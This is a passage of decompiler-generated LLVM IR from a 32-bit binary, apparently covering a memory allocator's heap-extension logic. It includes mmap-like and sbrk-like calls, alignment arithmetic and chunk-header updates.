  %v6_8052ccb = or i32 %v5_8052ccb, 1
  store i32 %v6_8052ccb, i32* %v4_8052ccb, align 4
  br label %dec_label_pc_8052d19

dec_label_pc_8052cd2:                             ; preds = %dec_label_pc_8052cb1
  %v2_8052cd6 = add i32 %v0_8052ccb, %v1_8052db6
  store i32 %v2_8052cd6, i32* %eax.global-to-local, align 4
  %v1_8052cdf = load i32, i32* @ebp, align 4
  %v2_8052cdf = add i32 %v1_8052cdf, 8
  %v3_8052cdf = inttoptr i32 %v2_8052cdf to i32*
  store i32 %v2_8052cd6, i32* %v3_8052cdf, align 4
  %v0_8052ce2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ce2 = load i32, i32* @ebp, align 4
  %v2_8052ce2 = add i32 %v1_8052ce2, 12
  %v3_8052ce2 = inttoptr i32 %v2_8052ce2 to i32*
  store i32 %v0_8052ce2, i32* %v3_8052ce2, align 4
  %v0_8052ce5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ce5 = add i32 %v0_8052ce5, 8
  %v2_8052ce5 = inttoptr i32 %v1_8052ce5 to i32*
  store i32 ptrtoint (i32* @global_var_8064c14.345 to i32), i32* %v2_8052ce5, align 4
  %v0_8052cec = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cec = add i32 %v0_8052cec, 12
  %v2_8052cec = inttoptr i32 %v1_8052cec to i32*
  store i32 ptrtoint (i32* @global_var_8064c14.345 to i32), i32* %v2_8052cec, align 4
  %v0_8052cf3 = load i32, i32* @global_var_8064c10.344, align 16
  %v4_8052cf9 = load i32, i32* %eax.global-to-local, align 4
  %v5_8052cf9 = select i1 %v8_8052a5f, i32 %v4_8052cf9, i32 %v0_8052cf3
  %v4_8052cfc = or i32 %v1_8052db6, 1
  store i32 %v5_8052cf9, i32* @global_var_8064c10.344, align 16
  %v0_8052d07 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8052cfc, i32* %ebx.global-to-local, align 4
  %v1_8052d0d = or i32 %v0_8052d07, 1
  store i32 %v1_8052d0d, i32* @edx, align 4
  %v3_8052d10 = add i32 %v0_8052d07, %v4_8052cf9
  %v4_8052d10 = inttoptr i32 %v3_8052d10 to i32*
  store i32 %v0_8052d07, i32* %v4_8052d10, align 4
  %v0_8052d13 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052d13 = load i32, i32* @ecx, align 4
  %v2_8052d13 = add i32 %v1_8052d13, 4
  %v3_8052d13 = inttoptr i32 %v2_8052d13 to i32*
  store i32 %v0_8052d13, i32* %v3_8052d13, align 4
  %v0_8052d16 = load i32, i32* @edx, align 4
  %v1_8052d16 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052d16 = add i32 %v1_8052d16, 4
  %v3_8052d16 = inttoptr i32 %v2_8052d16 to i32*
  store i32 %v0_8052d16, i32* %v3_8052d16, align 4
  br label %dec_label_pc_8052d19

dec_label_pc_8052d19:                             ; preds = %dec_label_pc_8052e0d, %dec_label_pc_8052ccb, %dec_label_pc_8052cd2
  %v0_8052d19 = load i32, i32* @ecx, align 4
  %v1_8052d19 = add i32 %v0_8052d19, 8
  store i32 %v1_8052d19, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053141

dec_label_pc_8052d21.loopexit:                    ; preds = %dec_label_pc_8052c66
  br label %dec_label_pc_8052d21

dec_label_pc_8052d21:                             ; preds = %dec_label_pc_8052d21.loopexit, %dec_label_pc_8052a21, %dec_label_pc_8052a29
  %v0_8052d21 = load i32, i32* @global_var_8064c0c.343, align 4
  store i32 %v0_8052d21, i32* @ebx, align 4
  store i32 %v1_8052db6, i32* %esi.global-to-local, align 4
  %v1_8052d2b = add i32 %v0_8052d21, 4
  %v2_8052d2b = inttoptr i32 %v1_8052d2b to i32*
  %v3_8052d2b = load i32, i32* %v2_8052d2b, align 4
  %v1_8052d2e = add i32 %v1_8052db6, 16
  store i32 %v1_8052d2e, i32* @esi, align 4
  %v1_8052d35 = and i32 %v3_8052d2b, -4
  store i32 %v1_8052d35, i32* %ecx.global-to-local, align 4
  %v7_8052d38 = icmp ult i32 %v1_8052d35, %v1_8052d2e
  br i1 %v7_8052d38, label %dec_label_pc_8052d58, label %dec_label_pc_8052d3c

dec_label_pc_8052d3c:                             ; preds = %dec_label_pc_8052d21
  %v2_8052d40 = add i32 %v0_8052d21, %v1_8052db6
  store i32 %v2_8052d40, i32* @edx, align 4
  %v1_8052d43 = or i32 %v1_8052db6, 1
  store i32 %v1_8052d43, i32* %eax.global-to-local, align 4
  store i32 %v2_8052d40, i32* @global_var_8064c0c.343, align 4
  store i32 %v1_8052d43, i32* %v2_8052d2b, align 4
  %v0_8052d4f = load i32, i32* %ecx.global-to-local, align 4
  %v5_8052d4f = sub i32 %v0_8052d4f, %v1_8052db6
  store i32 %v5_8052d4f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80530d1

dec_label_pc_8052d58:                             ; preds = %dec_label_pc_8052d21
  %v0_8052d58 = load i8, i8* @global_var_8064be0.342, align 32
  %v1_8052d58 = and i8 %v0_8052d58, 2
  %v2_8052d58 = icmp eq i8 %v1_8052d58, 0
  %v0_8052d5f = load i32, i32* @global_var_8064f3c.348, align 4
  store i32 %v0_8052d5f, i32* %edx.global-to-local, align 4
  br i1 %v2_8052d58, label %dec_label_pc_8052d8c, label %dec_label_pc_8052d67

dec_label_pc_8052d67:                             ; preds = %dec_label_pc_8052d58
  store i32 ptrtoint (i8* @global_var_8064be0.342 to i32), i32* %stack_var_-92, align 4
  %v2_8052d6f = call i32 @function_80531e9(i32* bitcast (i8* @global_var_8064be0.342 to i32*))
  store i32 ptrtoint (i8* @global_var_8064be0.342 to i32), i32* @ebx, align 4
  %v1_8052d79 = add i32 %v1_8052db6, -7
  store i32 %v1_8052d79, i32* %eax.global-to-local, align 4
  store i32 %v1_8052d79, i32* %stack_var_-92, align 4
  %v1_8052d7d = call i32 @function_80529ba(i32 %v1_8052d79)
  store i32 %v1_8052d7d, i32* %eax.global-to-local, align 4
  store i32 %v1_8052d7d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053141

dec_label_pc_8052d8c:                             ; preds = %dec_label_pc_8052d58
  store i32 %v1_8052db6, i32* @ebx, align 4
  %v1_8052d90 = add i32 %v0_8052d5f, -1
  store i32 %v1_8052d90, i32* @ecx, align 4
  %v1_8052d93 = load i32, i32* @global_var_8064f2c.349, align 4
  %v7_8052d93 = icmp ult i32 %v1_8052db6, %v1_8052d93
  br i1 %v7_8052d93, label %dec_label_pc_8052e6e, label %dec_label_pc_8052da3

dec_label_pc_8052da3:                             ; preds = %dec_label_pc_8052d8c
  %v0_8052da3 = load i32, i32* @global_var_8064f30.350, align 16
  store i32 %v0_8052da3, i32* %eax.global-to-local, align 4
  %v1_8052da8 = load i32, i32* @global_var_8064f34.351, align 4
  %v5_8052dae = icmp slt i32 %v0_8052da3, %v1_8052da8
  br i1 %v5_8052dae, label %dec_label_pc_8052db4, label %dec_label_pc_8052e6e

dec_label_pc_8052db4:                             ; preds = %dec_label_pc_8052da3
  %v2_8052db6 = add i32 %v1_8052db6, 10
  %v3_8052db6 = add i32 %v2_8052db6, %v0_8052d5f
  %v1_8052dba = sub i32 0, %v0_8052d5f
  store i32 %v1_8052dba, i32* %eax.global-to-local, align 4
  %v2_8052dbc = and i32 %v3_8052db6, %v1_8052dba
  store i32 %v2_8052dbc, i32* @ebx, align 4
  %tmp138 = icmp ugt i32 %v2_8052dbc, %v1_8052db6
  br i1 %tmp138, label %dec_label_pc_8052dc8, label %dec_label_pc_8052e6e

dec_label_pc_8052dc8:                             ; preds = %dec_label_pc_8052db4
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052dd5 = call i32 @function_8054390(i32 0, i32 %v2_8052dbc, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052d90, i32 %v1_8052d90)
  store i32 %v8_8052dd5, i32* %eax.global-to-local, align 4
  %v10_8052ddd = icmp eq i32 %v8_8052dd5, -1
  store i32 %v8_8052dd5, i32* %edx.global-to-local, align 4
  br i1 %v10_8052ddd, label %dec_label_pc_8052dc8.dec_label_pc_8052e6e_crit_edge, label %dec_label_pc_8052de8

dec_label_pc_8052dc8.dec_label_pc_8052e6e_crit_edge: ; preds = %dec_label_pc_8052dc8
  %v0_8052e6e.pre = load i32, i32* @global_var_8064c0c.343, align 4
  br label %dec_label_pc_8052e6e

dec_label_pc_8052de8:                             ; preds = %dec_label_pc_8052dc8
  %v1_8052dea = urem i32 %v8_8052dd5, 8
  %v2_8052dea = icmp eq i32 %v1_8052dea, 0
  store i32 %v1_8052dea, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052dea, label %dec_label_pc_8052e03, label %dec_label_pc_8052def

dec_label_pc_8052def:                             ; preds = %dec_label_pc_8052de8
  %v0_8052df4 = load i32, i32* @ebx, align 4
  %v2_8052df6 = sub nsw i32 8, %v1_8052dea
  store i32 %v2_8052df6, i32* %eax.global-to-local, align 4
  %v2_8052df8 = add i32 %v2_8052df6, %v8_8052dd5
  store i32 %v2_8052df8, i32* @ecx, align 4
  %v2_8052dfb = sub i32 %v0_8052df4, %v2_8052df6
  store i32 %v2_8052dfb, i32* %esi.global-to-local, align 4
  %v2_8052dfd = inttoptr i32 %v2_8052df8 to i32*
  store i32 %v2_8052df6, i32* %v2_8052dfd, align 4
  br label %dec_label_pc_8052e0d

dec_label_pc_8052e03:                             ; preds = %dec_label_pc_8052de8
  store i32 %v8_8052dd5, i32* @ecx, align 4
  %v1_8052e05 = inttoptr i32 %v8_8052dd5 to i32*
  store i32 0, i32* %v1_8052e05, align 4
  br label %dec_label_pc_8052e0d

dec_label_pc_8052e0d:                             ; preds = %dec_label_pc_8052def, %dec_label_pc_8052e03
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052def ], [ @ebx, %dec_label_pc_8052e03 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052e0d = or i32 %storemerge, 2
  %v1_8052e10 = load i32, i32* @ecx, align 4
  %v2_8052e10 = add i32 %v1_8052e10, 4
  %v3_8052e10 = inttoptr i32 %v2_8052e10 to i32*
  store i32 %v1_8052e0d, i32* %v3_8052e10, align 4
  %v0_8052e13 = load i32, i32* @global_var_8064f30.350, align 16
  %v0_8052e18 = load i32, i32* @global_var_8064f50.352, align 16
  %v1_8052e1e = add i32 %v0_8052e13, 1
  %v1_8052e1f = load i32, i32* @global_var_8064f38.353, align 8
  %v2_8052e1f = sub i32 %v1_8052e1e, %v1_8052e1f
  %v8_8052e1f = xor i32 %v1_8052e1f, %v1_8052e1e
  %v9_8052e1f = xor i32 %v2_8052e1f, %v1_8052e1e
  %v10_8052e1f = and i32 %v9_8052e1f, %v8_8052e1f
  %v11_8052e1f = icmp slt i32 %v10_8052e1f, 0
  %v12_8052e1f = icmp eq i32 %v2_8052e1f, 0
  %v13_8052e1f = icmp slt i32 %v2_8052e1f, 0
  store i32 %v1_8052e1e, i32* @global_var_8064f30.350, align 16
  %v3_8052e2a = icmp ne i1 %v13_8052e1f, %v11_8052e1f
  %v4_8052e2a = or i1 %v12_8052e1f, %v3_8052e2a
  %v7_8052e2a = select i1 %v4_8052e2a, i32 %v1_8052e1f, i32 %v1_8052e1e
  store i32 %v7_8052e2a, i32* @global_var_8064f38.353, align 8
  %v0_8052e36 = load i32, i32* @global_var_8064f44.354, align 4
  %v1_8052e3b = load i32, i32* @ebx, align 4
  %v2_8052e3b = add i32 %v1_8052e3b, %v0_8052e36
  store i32 %v2_8052e3b, i32* @global_var_8064f44.354, align 4
  %tmp86 = icmp ule i32 %v2_8052e3b, %v0_8052e18
  %v5_8052e48 = select i1 %tmp86, i32 %v0_8052e18, i32 %v2_8052e3b
  store i32 %v5_8052e48, i32* @edx, align 4
  %v1_8052e4b = load i32, i32* @global_var_8064f48.355, align 8
  %v2_8052e4b = add i32 %v1_8052e4b, %v2_8052e3b
  store i32 %v5_8052e48, i32* @global_var_8064f50.352, align 16
  %v1_8052e57 = load i32, i32* @global_var_8064f54.356, align 4
  %tmp139 = icmp ule i32 %v2_8052e4b, %v1_8052e57
  %v5_8052e5d = select i1 %tmp139, i32 %v1_8052e57, i32 %v2_8052e4b
  store i32 %v5_8052e5d, i32* %eax.global-to-local, align 4
  store i32 %v5_8052e5d, i32* @global_var_8064f54.356, align 4
  br label %dec_label_pc_8052d19

dec_label_pc_8052e6e:                             ; preds = %dec_label_pc_8052db4, %dec_label_pc_8052dc8.dec_label_pc_8052e6e_crit_edge, %dec_label_pc_8052da3, %dec_label_pc_8052d8c
  %v0_8052e6e = phi i32 [ %v0_8052e6e.pre, %dec_label_pc_8052dc8.dec_label_pc_8052e6e_crit_edge ], [ %v0_8052d21, %dec_label_pc_8052da3 ], [ %v0_8052d21, %dec_label_pc_8052db4 ], [ %v0_8052d21, %dec_label_pc_8052d8c ]
  store i32 %v0_8052e6e, i32* %eax.global-to-local, align 4
  %v1_8052e77 = add i32 %v0_8052e6e, 4
  %v2_8052e77 = inttoptr i32 %v1_8052e77 to i32*
  %v3_8052e77 = load i32, i32* %v2_8052e77, align 4
  %v1_8052e7e = and i32 %v3_8052e77, -4
  %v2_8052e7e = icmp eq i32 %v1_8052e7e, 0
  store i32 %v1_8052e7e, i32* @ebp, align 4
  %v1_8052e84 = load i32, i32* @global_var_8064f28.357, align 8
  %v0_8052e8e = load i8, i8* @global_var_8064f40.358, align 64
  %v1_8052e8e = urem i8 %v0_8052e8e, 2
  %v2_8052e8e = icmp eq i8 %v1_8052e8e, 0
  %v1_8052e95 = icmp eq i1 %v2_8052e8e, false
  %v1_8052e7e.op = sub i32 0, %v1_8052e7e
  %v2_8052e8c.neg = select i1 %v1_8052e95, i32 %v1_8052e7e.op, i32 0
  %v2_8052e84 = add i32 %v1_8052d90, %v1_8052d2e
  %v4_8052e95 = add i32 %v2_8052e84, %v1_8052e84
  %v5_8052e9c = add i32 %v4_8052e95, %v2_8052e8c.neg
  store i32 %v5_8052e9c, i32* %eax.global-to-local, align 4
  %v1_8052ea0 = sub i32 0, %v0_8052d5f
  store i32 %v1_8052ea0, i32* @edx, align 4
  %v2_8052ea4 = and i32 %v5_8052e9c, %v1_8052ea0
  store i32 %v2_8052ea4, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_8052ea4, 1
  br i1 %tmp87, label %dec_label_pc_8052ec2, label %dec_label_pc_8052eac

dec_label_pc_8052eac:                             ; preds = %dec_label_pc_8052e6e
  store i32 %v2_8052ea4, i32* %stack_var_-92, align 4
  %v1_8052eb0 = call i32 @function_805457c(i32 %v2_8052ea4)
  store i32 %v1_8052eb0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_8052ebb = icmp eq i32 %v1_8052eb0, -1
  store i32 %v1_8052eb0, i32* @ebx, align 4
  %v1_8052ec0 = icmp eq i1 %v10_8052ebb, false
  br i1 %v1_8052ec0, label %dec_label_pc_8052f19, label %dec_label_pc_8052eac.dec_label_pc_8052ec2_crit_edge

dec_label_pc_8052eac.dec_label_pc_8052ec2_crit_edge: ; preds = %dec_label_pc_8052eac
  %v0_8052ec2.pre = load i8, i8* @global_var_8064f40.358, align 64
  br label %dec_label_pc_8052ec2

dec_label_pc_8052ec2:                             ; preds = %dec_label_pc_8052eac.dec_label_pc_8052ec2_crit_edge, %dec_label_pc_8052e6e
  %v0_8052eef = phi i32 [ -1, %dec_label_pc_8052eac.dec_label_pc_8052ec2_crit_edge ], [ %v1_8052ea0, %dec_label_pc_8052e6e ]
  %v0_8052ec2 = phi i8 [ %v0_8052ec2.pre, %dec_label_pc_8052eac.dec_label_pc_8052ec2_crit_edge ], [ %v0_8052e8e, %dec_label_pc_8052e6e ]
  %v1_8052ec2 = urem i8 %v0_8052ec2, 2
  %v2_8052ec2 = icmp eq i8 %v1_8052ec2, 0
  br i1 %v2_8052ec2, label %dec_label_pc_8052ec2.dec_label_pc_8052ed7_crit_edge, label %dec_label_pc_8052ecb

dec_label_pc_8052ec2.dec_label_pc_8052ed7_crit_edge: ; preds = %dec_label_pc_8052ec2
  %v0_8052ed7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052ed7

dec_label_pc_8052ecb:                             ; preds = %dec_label_pc_8052ec2
  %v2_8052ecf = add i32 %v1_8052e7e, %v1_8052d90
  store i32 %v2_8052ecf, i32* %eax.global-to-local, align 4
  %v0_8052ed1 = load i32, i32* @esi, align 4
  %v2_8052ed1 = add i32 %v0_8052ed1, %v2_8052ecf
  %v5_8052ed3 = and i32 %v2_8052ed1, %v1_8052ea0
  store i32 %v5_8052ed3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052ed7

dec_label_pc_8052ed7:                             ; preds = %dec_label_pc_8052ec2.dec_label_pc_8052ed7_crit_edge, %dec_label_pc_8052ecb
  %v3_8052ee2 = phi i32 [ %v0_8052ed7.pre, %dec_label_pc_8052ec2.dec_label_pc_8052ed7_crit_edge ], [ %v5_8052ed3, %dec_label_pc_8052ecb ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_8052ee2, 1048576
  %v5_8052ee2 = select i1 %tmp88, i32 1048576, i32 %v3_8052ee2
  store i32 %v5_8052ee2, i32* @esi, align 4
  %tmp140 = icmp ugt i32 %v5_8052ee2, %v1_8052db6
  br i1 %tmp140, label %dec_label_pc_8052eef, label %dec_label_pc_8053134

dec_label_pc_8052eef:                             ; preds = %dec_label_pc_8052ed7
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052efc = call i32 @function_8054390(i32 0, i32 %v5_8052ee2, i32 3, i32 34, i32 0, i32 0, i32 %v0_8052eef, i32 %v0_8052eef)
  store i32 %v8_8052efc, i32* %eax.global-to-local, align 4
  %v10_8052f04 = icmp eq i32 %v8_8052efc, -1
  store i32 %v8_8052efc, i32* @ebx, align 4
  br i1 %v10_8052f04, label %dec_label_pc_8053134, label %dec_label_pc_8052f0f

dec_label_pc_8052f0f:                             ; preds = %dec_label_pc_8052eef
  %v0_8052f0f = load i8, i8* @global_var_8064f40.358, align 1
  %v2_8052f0f = and i8 %v0_8052f0f, -2
  store i8 %v2_8052f0f, i8* @global_var_8064f40.358, align 64
  %v1_8052f16 = load i32, i32* @esi, align 4
  %v2_8052f16 = add i32 %v1_8052f16, %v8_8052efc
  store i32 %v2_8052f16, i32* @edx, align 4
  br label %dec_label_pc_8052f19

dec_label_pc_8052f19:                             ; preds = %dec_label_pc_8052eac, %dec_label_pc_8052f0f
  %v0_8052fe0 = phi i32 [ -1, %dec_label_pc_8052eac ], [ %v2_8052f16, %dec_label_pc_8052f0f ]
  %v0_8052fee = phi i32 [ %v1_8052eb0, %dec_label_pc_8052eac ], [ %v8_8052efc, %dec_label_pc_8052f0f ]
  %v10_8052f19 = icmp eq i32 %v0_8052fee, -1
  br i1 %v10_8052f19, label %dec_label_pc_8053134, label %dec_label_pc_8052f22

dec_label_pc_8052f22:                             ; preds = %dec_label_pc_8052f19
  %v0_8052f26 = load i32, i32* @global_var_8064f48.355, align 8
  %v1_8052f26 = load i32, i32* @esi, align 4
  %v2_8052f26 = add i32 %v1_8052f26, %v0_8052f26
  store i32 %v2_8052f26, i32* @global_var_8064f48.355, align 8
  %v2_8052f2c = add i32 %v1_8052e7e, %v0_8052e6e
  store i32 %v2_8052f2c, i32* %ecx.global-to-local, align 4
  %v2_8052f2e = sub i32 %v0_8052fee, %v2_8052f2c
  %v7_8052f2e = icmp ult i32 %v0_8052fee, %v2_8052f2c
  %v12_8052f2e = icmp eq i32 %v2_8052f2e, 0
  %v1_8052f30 = icmp eq i1 %v12_8052f2e, false
  br i1 %v1_8052f30, label %dec_label_pc_8052f49, label %dec_label_pc_8052f32

dec_label_pc_8052f32:                             ; preds = %dec_label_pc_8052f22
  %v10_8052f32 = icmp eq i32 %v0_8052fe0, -1
  %v1_8052f35 = icmp eq i1 %v10_8052f32, false
  br i1 %v1_8052f35, label %dec_label_pc_8052f49, label %dec_label_pc_8052f37

dec_label_pc_8052f37:                             ; preds = %dec_label_pc_8052f32
  store i32 %v0_8052e6e, i32* %ecx.global-to-local, align 4
  %v2_8052f3b = add i32 %v1_8052f26, %v1_8052e7e
  %v1_8052f3e = or i32 %v2_8052f3b, 1
  store i32 %v1_8052f3e, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f3e, i32* %v2_8052e77, align 4
  br label %dec_label_pc_8053076

dec_label_pc_8052f49:                             ; preds = %dec_label_pc_8052f32, %dec_label_pc_8052f22
  %v0_8052f49 = load i8, i8* @global_var_8064f40.358, align 1
  %v1_8052f49 = sext i8 %v0_8052f49 to i32
  store i32 %v1_8052f49, i32* %eax.global-to-local, align 4
  %v2_8052f4e = urem i8 %v0_8052f49, 2
  %v3_8052f4e = icmp eq i8 %v2_8052f4e, 0
  br i1 %v3_8052f4e, label %dec_label_pc_8052f62, label %dec_label_pc_8052f52

dec_label_pc_8052f52:                             ; preds = %dec_label_pc_8052f49
  br i1 %v2_8052e7e, label %dec_label_pc_8052f62, label %dec_label_pc_8052f56

dec_label_pc_8052f56:                             ; preds = %dec_label_pc_8052f52
  %v1_8052f58 = icmp eq i1 %v7_8052f2e, false
  br i1 %v1_8052f58, label %dec_label_pc_8052f62, label %dec_label_pc_8052f5a

dec_label_pc_8052f5a:                             ; preds = %dec_label_pc_8052f56
  %v1_8052f5a = and i32 %v1_8052f49, -2
  %v4_8052f5a = trunc i32 %v1_8052f5a to i8
  store i32 %v1_8052f5a, i32* %eax.global-to-local, align 4
  store i8 %v4_8052f5a, i8* @global_var_8064f40.358, align 64
  br label %dec_label_pc_8052f62

dec_label_pc_8052f62:                             ; preds = %dec_label_pc_8052f56, %dec_label_pc_8052f52, %dec_label_pc_8052f49, %dec_label_pc_8052f5a
  %v0_8052f62 = phi i8 [ %v0_8052f49, %dec_label_pc_8052f56 ], [ %v0_8052f49, %dec_label_pc_8052f52 ], [ %v0_8052f49, %dec_label_pc_8052f49 ], [ %v4_8052f5a, %dec_label_pc_8052f5a ]
  %v1_8052f62 = urem i8 %v0_8052f62, 2
  %v2_8052f62 = icmp eq i8 %v1_8052f62, 0
  br i1 %v2_8052f62, label %dec_label_pc_8052fe0, label %dec_label_pc_8052f6b

dec_label_pc_8052f6b:                             ; preds = %dec_label_pc_8052f62
  br i1 %v2_8052e7e, label %dec_label_pc_8052f79, label %dec_label_pc_8052f6f

dec_label_pc_8052f6f:                             ; preds = %dec_label_pc_8052f6b
  store i32 %v2_8052f2e, i32* %eax.global-to-local, align 4
  %v2_8052f73 = add i32 %v2_8052f26, %v2_8052f2e
  store i32 %v2_8052f73, i32* @global_var_8064f48.355, align 8
  br label %dec_label_pc_8052f79

dec_label_pc_8052f79:                             ; preds = %dec_label_pc_8052f6b, %dec_label_pc_8052f6f
  %v1_8052f7b = urem i32 %v0_8052fee, 8
  %v2_8052f7b = icmp eq i32 %v1_8052f7b, 0
  store i32 %v1_8052f7b, i32* %edx.global-to-local, align 4
  %v1_8052f7e = icmp eq i1 %v2_8052f7b, false
  br i1 %v1_8052f7e, label %dec_label_pc_8052f86, label %dec_label_pc_8052f80

dec_label_pc_8052f80:                             ; preds = %dec_label_pc_8052f79
  store i32 %v0_8052fee, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f90

dec_label_pc_8052f86:                             ; preds = %dec_label_pc_8052f79
  %v2_8052f8b = sub nsw i32 8, %v1_8052f7b
  store i32 %v2_8052f8b, i32* %eax.global-to-local, align 4
  %v2_8052f8d = add i32 %v2_8052f8b, %v0_8052fee
  store i32 %v2_8052f8d, i32* @edi, align 4
  br label %dec_label_pc_8052f90

dec_label_pc_8052f90:                             ; preds = %dec_label_pc_8052f80, %dec_label_pc_8052f86
  %v0_8052f9d = phi i32 [ 0, %dec_label_pc_8052f80 ], [ %v2_8052f8b, %dec_label_pc_8052f86 ]
  %v2_8052f90 = add i32 %v1_8052f26, %v0_8052fee
  %v2_8052f9d = add i32 %v0_8052f9d, %v1_8052e7e
  store i32 %v2_8052f9d, i32* %ecx.global-to-local, align 4
  %v2_8052fa0 = add i32 %v2_8052f9d, %v2_8052f90
  store i32 %v2_8052fa0, i32* %edx.global-to-local, align 4
  %v2_8052fa2 = add i32 %v2_8052fa0, %v1_8052d90
  %v5_8052fa5 = and i32 %v2_8052fa2, %v1_8052ea0
  %v2_8052fac = sub i32 %v5_8052fa5, %v2_8052fa0
  store i32 %v2_8052fac, i32* %eax.global-to-local, align 4
  %v2_8052fae = add i32 %v2_8052fac, %v2_8052f9d
  store i32 %v2_8052fae, i32* @esi, align 4
  store i32 %v2_8052fae, i32* %stack_var_-92, align 4
  %v1_8052fb2 = call i32 @function_805457c(i32 %v2_8052fae)
  store i32 %v1_8052fb2, i32* %eax.global-to-local, align 4
  %v10_8052fba = icmp eq i32 %v1_8052fb2, -1
  store i32 %v1_8052fb2, i32* %edx.global-to-local, align 4
  %v1_8052fbf = icmp eq i1 %v10_8052fba, false
  br i1 %v1_8052fbf, label %dec_label_pc_8052fcf, label %dec_label_pc_8052fc1

dec_label_pc_8052fc1:                             ; preds = %dec_label_pc_8052f90
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052fc6 = call i32 @function_805457c(i32 0)
  store i32 %v1_8052fc6, i32* %eax.global-to-local, align 4
  store i32 %v1_8052fc6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053003

dec_label_pc_8052fcf:                             ; preds = %dec_label_pc_8052f90
  %v1_8052fcf = load i32, i32* @ebx, align 4
  %v7_8052fcf = icmp ult i32 %v1_8052fb2, %v1_8052fcf
  %v1_8052fd1 = icmp eq i1 %v7_8052fcf, false
  br i1 %v1_8052fd1, label %dec_label_pc_8053008, label %dec_label_pc_8052fd3

dec_label_pc_8052fd3:                             ; preds = %dec_label_pc_8052fcf
  %v0_8052fd3 = load i8, i8* @global_var_8064f40.358, align 1
  %v2_8052fd3 = and i8 %v0_8052fd3, -2
  store i8 %v2_8052fd3, i8* @global_var_8064f40.358, align 64
  store i32 %v2_8052f90, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052fe7

dec_label_pc_8052fe0:                             ; preds = %dec_label_pc_8052f62
  %v10_8052fe0 = icmp eq i32 %v0_8052fe0, -1
  br i1 %v10_8052fe0, label %dec_label_pc_8052feb, label %dec_label_pc_8052fe5

dec_label_pc_8052fe5:                             ; preds = %dec_label_pc_8052fe0
  store i32 %v0_8052fee, i32* @edi, align 4
  br label %dec_label_pc_8052fe7

dec_label_pc_8052fe7:                             ; preds = %dec_label_pc_8052fd3, %dec_label_pc_8052fe5
  %v0_805300847 = phi i32 [ %v2_8052f90, %dec_label_pc_8052fd3 ], [ %v0_8052fe0, %dec_label_pc_8052fe5 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053008

dec_label_pc_8052feb:                             ; preds = %dec_label_pc_8052fe0
  store i32 %v0_8052fee, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052ff2 = call i32 @function_805457c(i32 0)
  store i32 %v1_8052ff2, i32* %edx.global-to-local, align 4
  %v1_8052ff9 = load i32, i32* @ebx, align 4
  %v2_8052ff9 = sub i32 %v1_8052ff2, %v1_8052ff9
  %v1_8052ffb = load i32, i32* @esi, align 4
  %v2_8052ffb = sub i32 %v2_8052ff9, %v1_8052ffb
  store i32 %v2_8052ffb, i32* %eax.global-to-local, align 4
  %v0_8052ffd = load i32, i32* @global_var_8064f48.355, align 8
  %v2_8052ffd = add i32 %v0_8052ffd, %v2_8052ffb
  store i32 %v2_8052ffd, i32* @global_var_8064f48.355, align 8
  br label %dec_label_pc_8053003

dec_label_pc_8053003:                             ; preds = %dec_label_pc_8052fc1, %dec_label_pc_8052feb
  %v0_805300846 = phi i32 [ %v1_8052fc6, %dec_label_pc_8052fc1 ], [ %v1_8052ff2, %dec_label_pc_8052feb ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053008

dec_label_pc_8053008:                             ; preds = %dec_label_pc_8052fcf, %dec_label_pc_8052fe7, %dec_label_pc_8053003
  %v0_805300d = phi i32 [ %v1_8052fb2, %dec_label_pc_8052fcf ], [ %v0_805300847, %dec_label_pc_8052fe7 ], [ %v0_805300846, %dec_label_pc_8053003 ]
  %v10_8053008 = icmp eq i32 %v0_805300d, -1
  br i1 %v10_8053008, label %dec_label_pc_8053076, label %dec_label_pc_805300d

dec_label_pc_805300d:                             ; preds = %dec_label_pc_8053008
  %v1_805300d = load i32, i32* @edi, align 4
  %v2_805300d = sub i32 %v0_805300d, %v1_805300d
  store i32 %v2_805300d, i32* %edx.global-to-local, align 4
  %v1_805300f = load i32, i32* @esi, align 4
  %v2_805300f = add i32 %v1_805300f, %v2_805300d
  %v1_8053012 = or i32 %v2_805300f, 1
  store i32 %v1_8053012, i32* %eax.global-to-local, align 4
  store i32 %v1_805300d, i32* @global_var_8064c0c.343, align 4
  %v2_805301b = add i32 %v1_805300d, 4
  %v3_805301b = inttoptr i32 %v2_805301b to i32*
  store i32 %v1_8053012, i32* %v3_805301b, align 4
  %v0_805301e = load i32, i32* @global_var_8064f48.355, align 8
  %v1_805301e = load i32, i32* @esi, align 4
  %v2_805301e = add i32 %v1_805301e, %v0_805301e
  store i32 %v2_805301e, i32* @global_var_8064f48.355, align 8
  br i1 %v2_8052e7e, label %dec_label_pc_8053076, label %dec_label_pc_8053028

dec_label_pc_8053028:                             ; preds = %dec_label_pc_805300d
  store i32 %v0_8052e6e, i32* %ecx.global-to-local, align 4
  %v1_805302c = add i32 %v1_8052e7e, -12
  %v1_805302f = and i32 %v1_805302c, -8
  store i32 %v1_805302f, i32* %eax.global-to-local, align 4
  %v1_8053034 = or i32 %v1_805302f, 1
